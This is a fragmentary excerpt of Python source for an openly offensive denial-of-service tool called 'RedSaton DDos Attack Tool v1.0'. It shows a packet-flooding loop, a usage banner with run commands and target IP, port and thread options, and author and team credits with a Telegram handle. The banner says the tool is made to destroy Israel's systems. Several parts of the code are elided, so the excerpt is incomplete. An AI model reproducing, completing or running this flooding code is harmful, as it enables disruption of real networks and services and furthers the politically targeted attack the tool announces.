...
def bot_hammering(url):
	try:
		while True:
			...
			print("\033[94mRedsaton Is Activate...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)
	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--Packet Sent! RedSaton Is Attacking--> \033[0m")
			else:
				s.shutdown(1)
...
def usage():
	print (''' \033[92m	RedSaton DDos Attack Tool v1.0
                    Made By Dr.Zilzath
        Team : Lashkare Mahdi
        Telegram : @Zilzath
	This Tool Is Made To Destory Israel System. \n
     >>	Usage : python3 redsaton.py [-s] [-p] [-t]
     >> For Example : python3 redsaton.py -s 123.45.67 -p 80 -t 135
	-h : Help
	-s : Server Ip
	-p : Port Default 80
...
def get_parameters():
	...
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="RedSatons")
